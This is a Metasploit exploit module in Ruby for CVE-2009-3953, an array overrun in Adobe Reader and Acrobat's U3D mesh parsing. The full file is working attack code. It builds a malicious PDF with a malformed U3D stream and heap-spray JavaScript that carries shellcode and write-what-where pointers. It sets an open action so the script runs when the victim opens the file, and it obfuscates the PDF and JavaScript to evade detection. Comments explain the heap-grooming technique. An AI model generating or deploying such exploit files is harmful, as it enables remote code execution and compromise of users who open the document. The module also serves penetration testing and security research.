##
# $Id: adobe_u3d_meshdecl.rb 10477 2010-09-25 11:59:02Z mc $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'zlib'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Adobe U3D CLODProgressiveMeshDeclaration Array Overrun',
			'Description'    => %q{
					This module exploits an array overflow in Adobe Reader and Adobe Acrobat.
					Affected versions include < 7.1.4, < 8.2, and < 9.3. By creating a
					specially crafted pdf that a contains malformed U3D data, an attacker may
					be able to execute arbitrary code.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Felipe Andres Manzano <felipe.andres.manzano[at]gmail.com>',
					'jduck'
				],
			'Version'        => '$Revision: 10477 $',
			'References'     =>
				[
					[ 'CVE', '2009-3953' ],
					[ 'OSVDB', '61690' ],
					[ 'URL', 'http://www.adobe.com/support/security/bulletins/apsb10-02.html' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'DisablePayloadHandler' => 'true',
				},
			'Payload'        =>
				{
					'Space'         => 1024,
					'BadChars'      => "\x00",
					'DisableNops'	 => true
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# test results (on Windows XP SP3)
					# reader 7.0.5 - untested
					# reader 7.0.8 - untested
					# reader 7.0.9 - untested
					# reader 7.1.0 - untested
					# reader 7.1.1 - untested
					# reader 8.0.0 - untested
					# reader 8.1.2 - works
					# reader 8.1.3 - not working :-/
					# reader 8.1.4 - untested
					# reader 8.1.5 - untested
					# reader 8.1.6 - untested
					# reader 9.0.0 - untested
					# reader 9.1.0 - works
					[ 'Adobe Reader Windows Universal (JS Heap Spray)',
						{
							'Size'		=> (6500/20),
							'DataAddr'	=> 0x09011020,
							'WriteAddr'	=> 0x7c49fb34,
						}
					],
				],
			'DisclosureDate' => 'Oct 13 2009',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('FILENAME', [ true, 'The file name.',  'msf.pdf']),
			], self.class)

	end



	def exploit
		# Encode the shellcode.
		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))

		# Make some nops
		nops    = Rex::Text.to_unescape(make_nops(4))

=begin

Original notes on heap technique used in this exploit:

## PREPAREHOLES:
## We will construct 6500*20 bytes long chunks starting like this
## |0         |6   |8       |C        |24                    |size
## |00000...  |0100|20100190|0000...  |    ......pad......   |
##                 \      \
##                 \      \ -Pointer: to controlled data
##                   \ -Flag: must be 1
## -Adobe will handle this ragged structure if the Flag is on.
## -Adobe will get 'what to write where' from the memory pointed
##  by our supplied Pointer.
##
## then allocate a bunch of those ..
## .. | chunk | chunk | chunk | chunck | chunk | chunck | chunck | ..
##    |XXXXXXX|XXXXXXX|XXXXXXX|XXXXXXXX|XXXXXXX|XXXXXXXX|XXXXXXXX|
##
## and then free some of them...
## .. | chunk | free  | chunk |  free  | chunk |  free  | chunck | ..
##    |XXXXXXX|       |XXXXXXX|        |XXXXXXX|        |XXXXXXXX|
##
## This way controlling when the next 6500*20 malloc will be
## followed with. We freed more than one hole so it became tolerant
## to some degree of malloc/free trace noise.
## Note the 6500 is arbitrary it should be a fairly unused chunk size
## not big enough to cause a different type of allocation.
## Also as we don't need to reference it from anywhere we don't care
## where this hole layout is placed in memory.

## PREPAREMEMORY:
## In the next technique we make a big-chunk of 0x10000 bytes
## repeating a 0x1000 bytes long mini-chunk of controled data.
## Big-chunks are always allocated aligned to 0x1000. And if we
## allocate a fair amount of big-chuncks (XPSPx) we'll be confident
## Any 0x1000 aligned 0x1000 bytes from 0x09000000 to 0x0a000000
## will have our mini chunk
##
## A mini-chunk will have this look
##
## |0         |10          |54         |?           |0xff0  |0x1000
## |00000...  |  POINTERS  |    nops   | shellcode  |  pad  |
##
## So we control what is in 0x09XXXXXX. shellcode will be at 0x09XXX054+
## But we use 0x09011064.
## POINTERS looks like this:
## ...

=end

		# prepare the hole
		daddr = target['DataAddr']
		hole_data = [0,0,1,daddr].pack('VvvV')
		#padding
		hole_data << "\x00" * 24
		hole = Rex::Text.to_unescape(hole_data)

		# prepare ptrs
		ptrs_data = [0].pack('V')
		#where to write
		ptrs_data << [target['WriteAddr'] / 4].pack('V')
		#must be greater tan 5 and less than x for getting us where we want
		ptrs_data << [6].pack('V')
		#what to write
		ptrs_data << [(daddr+0x10)].pack('V')
		#autopointer for print magic(tm)
		ptrs_data << [(daddr+0x14)].pack('V')
		#function pointers for print magic(tm)
		#pointing to our shellcode
		ptrs_data << [(daddr+0x44)].pack('V') * 12
		ptrs = Rex::Text.to_unescape(ptrs_data)

		js_doc = <<-EOF
function prepareHoles(slide_size)
{
	var size = 1000;
	var xarr = new Array(size);
	var hole = unescape("#{hole}");
	var pad = unescape("%u5858");
	while (pad.length <= slide_size/2 - hole.length)
		pad += pad;
	for (loop1=0; loop1 < size; loop1+=1)
	{
		ident = ""+loop1;
		xarr[loop1]=hole + pad.substring(0,slide_size/2-hole.length);
	}
	for (loop2=0;loop2<100;loop2++)
	{
		for (loop1=size/2; loop1 < size-2; loop1+=2)
		{
			xarr[loop1]=null;
			xarr[loop1]=pad.substring(0,0x10000/2 )+"A";
			xarr[loop1]=null;
		}
	}
	return xarr;
}

function prepareMemory(size)
{
	var mini_slide_size = 0x1000;
	var slide_size = 0x100000;
	var xarr = new Array(size);
	var pad = unescape("%ucccc");

	while (pad.length <= 32 )
		pad += pad;

	var nops = unescape("#{nops}");
	while (nops.length <= mini_slide_size/2 - nops.length)
		nops += nops;

	var shellcode = unescape("#{shellcode}");
	var pointers = unescape("#{ptrs}");
	var chunk = nops.substring(0,32/2) + pointers +
		nops.substring(0,mini_slide_size/2-pointers.length - shellcode.length - 32) +
		shellcode + pad.substring(0,32/2);
	chunk=chunk.substring(0,mini_slide_size/2);
	while (chunk.length <= slide_size/2)
		chunk += chunk;

	for (loop1=0; loop1 < size; loop1+=1)
	{
		ident = ""+loop1;
		xarr[loop1]=chunk.substring(16,slide_size/2 -32-ident.length)+ident;
	}
	return xarr;
}

	var mem = prepareMemory(200);
	var holes = prepareHoles(6500);
	this.pageNum = 1;
EOF
		js_pg1 = %Q|this.print({bUI:true, bSilent:false, bShrinkToFit:false});|

		# Obfuscate it up a bit
		js_doc = obfuscate_js(js_doc,
			'Symbols' => {
				'Variables' => %W{ slide_size size hole pad mini_slide_size nops shellcode pointers chunk mem holes xarr loop1 loop2 ident },
				'Methods' => %W{ prepareMemory prepareHoles }
			}).to_s

		# create the u3d stuff
		u3d = make_u3d_stream(target['Size'], rand_text_alpha(rand(28)+4))

		# Create the pdf
		pdf = make_pdf(u3d, js_doc, js_pg1)

		print_status("Creating '#{datastore['FILENAME']}' file...")

		file_create(pdf)
	end


	def obfuscate_js(javascript, opts)
		js = Rex::Exploitation::ObfuscateJS.new(javascript, opts)
		js.obfuscate
		return js
	end


	def RandomNonASCIIString(count)
		result = ""
		count.times do
			result << (rand(128) + 128).chr
		end
		result
	end

	def ioDef(id)
		"%d 0 obj\n" % id
	end

	def ioRef(id)
		"%d 0 R" % id
	end

	#http://blog.didierstevens.com/2008/04/29/pdf-let-me-count-the-ways/
	def nObfu(str)

		result = ""
		str.scan(/./u) do |c|
			if rand(2) == 0 and c.upcase >= 'A' and c.upcase <= 'Z'
				result << "#%x" % c.unpack("C*")[0]
			else
				result << c
			end
		end
		result
	end

	def ASCIIHexWhitespaceEncode(str)
		result = ""
		whitespace = ""
		str.each_byte do |b|
			result << whitespace << "%02x" % b
			whitespace = " " * (rand(3) + 1)
		end
		result << ">"
	end

	def u3d_pad(str, char="\x00")
		ret = ""
		if (str.length % 4) > 0
			ret << char * (4 - (str.length % 4))
		end
		return ret
	end


	def make_u3d_stream(size, meshname)

		# build the U3D header
		hdr_data = [1,0].pack('n*') # version info
		hdr_data << [0,0x24,31337,0,0x6a].pack('VVVVV')
		hdr = "U3D\x00"
		hdr << [hdr_data.length,0].pack('VV')
		hdr << hdr_data

		# mesh declaration
		decl_data = [meshname.length].pack('v')
		decl_data << meshname
		decl_data << [0].pack('V') # chain idx
		# max mesh desc
		decl_data << [0].pack('V') # mesh attrs
		decl_data << [1].pack('V') # face count
		decl_data << [size].pack('V') # position count
		decl_data << [4].pack('V') # normal count
		decl_data << [0].pack('V') # diffuse color count
		decl_data << [0].pack('V') # specular color count
		decl_data << [0].pack('V') # texture coord count
		decl_data << [1].pack('V') # shading count
		# shading desc
		decl_data << [0].pack('V') # shading attr
		decl_data << [0].pack('V') # texture layer count
		decl_data << [0].pack('V') # texture coord dimensions
		# no textore coords (original shading ids)
		decl_data << [size+2].pack('V') # minimum resolution
		decl_data << [size+3].pack('V') # final maximum resolution (needs to be bigger than the minimum)
		# quality factors
		decl_data << [0x12c].pack('V') # position quality factor
		decl_data << [0x12c].pack('V') # normal quality factor
		decl_data << [0x12c].pack('V') # texture coord quality factor
		# inverse quantiziation
		decl_data << [0].pack('V') # position inverse quant
		decl_data << [0].pack('V') # normal inverse quant
		decl_data << [0].pack('V') # texture coord inverse quant
		decl_data << [0].pack('V') # diffuse color inverse quant
		decl_data << [0].pack('V') # specular color inverse quant
		# resource params
		decl_data << [0].pack('V') # normal crease param
		decl_data << [0].pack('V') # normal update param
		decl_data << [0].pack('V') # normal tolerance param
		# skeleton description
		decl_data << [0].pack('V') # bone count
		# padding
		decl_pad = u3d_pad(decl_data)
		mesh_decl = [0xffffff31,decl_data.length,0].pack('VVV')
		mesh_decl << decl_data
		mesh_decl << decl_pad

		# build the modifier chain
		chain_data = [meshname.length].pack('v')
		chain_data << meshname
		chain_data << [1].pack('V') # type (model resource)
		chain_data << [0].pack('V') # attributes (no bounding info)
		chain_data << u3d_pad(chain_data)
		chain_data << [1].pack('V') # number of modifiers
		chain_data << mesh_decl
		modifier_chain = [0xffffff14,chain_data.length,0].pack('VVV')
		modifier_chain << chain_data

		# mesh continuation
		cont_data = [meshname.length].pack('v')
		cont_data << meshname
		cont_data << [0].pack('V') # chain idx
		cont_data << [0].pack('V') # start resolution
		cont_data << [0].pack('V') # end resolution
		# no resolution update, unknown data follows
		cont_data << [0].pack('V')
		cont_data << [1].pack('V') * 10
		mesh_cont = [0xffffff3c,cont_data.length,0].pack('VVV')
		mesh_cont << cont_data
		mesh_cont << u3d_pad(cont_data)

		data = hdr
		data << modifier_chain
		data << mesh_cont

		# patch the length
		data[24,4] = [data.length].pack('V')

		return data

	end

	def make_pdf(u3d_stream, js_doc, js_pg1)

		xref = []
		eol = "\x0a"
		obj_end = "" << eol << "endobj" << eol

		# the header
		pdf = "%PDF-1.7" << eol

		# filename/comment
		pdf << "%" << RandomNonASCIIString(4) << eol

		# js stream (doc open action js)
		xref << pdf.length
		compressed = Zlib::Deflate.deflate(ASCIIHexWhitespaceEncode(js_doc))
		pdf << ioDef(1) << nObfu("<</Length %s/Filter[/FlateDecode/ASCIIHexDecode]>>" % compressed.length) << eol
		pdf << "stream" << eol
		pdf << compressed << eol
		pdf << "endstream" << eol
		pdf << obj_end

		# js stream 2 (page 1 annot js)
		xref << pdf.length
		compressed = Zlib::Deflate.deflate(ASCIIHexWhitespaceEncode(js_pg1))
		pdf << ioDef(2) << nObfu("<</Length %s/Filter[/FlateDecode/ASCIIHexDecode]>>" % compressed.length) << eol
		pdf << "stream" << eol
		pdf << compressed << eol
		pdf << "endstream" << eol
		pdf << obj_end

		# catalog
		xref << pdf.length
		pdf << ioDef(3) << nObfu("<</Type/Catalog/Outlines ") << ioRef(4)
		pdf << nObfu("/Pages ") << ioRef(5)
		pdf << nObfu("/OpenAction ") << ioRef(8) << nObfu(">>")
		pdf << obj_end

		# outline
		xref << pdf.length
		pdf << ioDef(4) << nObfu("<</Type/Outlines/Count 0>>")
		pdf << obj_end

		# pages/kids
		xref << pdf.length
		pdf << ioDef(5) << nObfu("<</Type/Pages/Count 2/Kids [")
		pdf << ioRef(10) << " " # empty page
		pdf << ioRef(11) # u3d page
		pdf << nObfu("]>>")
		pdf << obj_end

		# u3d stream
		xref << pdf.length
		pdf << ioDef(6) << nObfu("<</Type/3D/Subtype/U3D/Length %s>>" % u3d_stream.length) << eol
		pdf << "stream" << eol
		pdf << u3d_stream << eol
		pdf << "endstream"
		pdf << obj_end

		# u3d annotation object
		xref << pdf.length
		pdf << ioDef(7) << nObfu("<</Type/Annot/Subtype")
		pdf << "/3D/3DA <</A/PO/DIS/I>>"
		pdf << nObfu("/Rect [0 0 640 480]/3DD ") << ioRef(6) << nObfu("/F 7>>")
		pdf << obj_end

		# js dict (open action js)
		xref << pdf.length
		pdf << ioDef(8) << nObfu("<</Type/Action/S/JavaScript/JS ") + ioRef(1) + ">>" << obj_end

		# js dict (page 1 annot js)
		xref << pdf.length
		pdf << ioDef(9) << nObfu("<</Type/Action/S/JavaScript/JS ") + ioRef(2) + ">>" << obj_end

		# page 0 (empty)
		xref << pdf.length
		pdf << ioDef(10) << nObfu("<</Type/Page/Parent ") << ioRef(5) << nObfu("/MediaBox [0 0 640 480]")
		pdf << nObfu(" >>")
		pdf << obj_end

		# page 1 (u3d/print)
		xref << pdf.length
		pdf << ioDef(11) << nObfu("<</Type/Page/Parent ") << ioRef(5) << nObfu("/MediaBox [0 0 640 480]")
		pdf << nObfu("/Annots [") << ioRef(7) << nObfu("]")
		pdf << nObfu("/AA << /O ") << ioRef(9) << nObfu(">>")
		pdf << nObfu(">>")
		pdf << obj_end

		# xrefs
		xrefPosition = pdf.length
		pdf << "xref" << eol
		pdf << "0 %d" % (xref.length + 1) << eol
		pdf << "0000000000 65535 f" << eol
		xref.each do |index|
			pdf << "%010d 00000 n" % index << eol
		end

		# trailer
		pdf << "trailer" << eol
		pdf << nObfu("<</Size %d/Root " % (xref.length + 1)) << ioRef(3) << ">>" << eol
		pdf << "startxref" << eol
		pdf << xrefPosition.to_s() << eol
		pdf << "%%EOF" << eol

	end

end

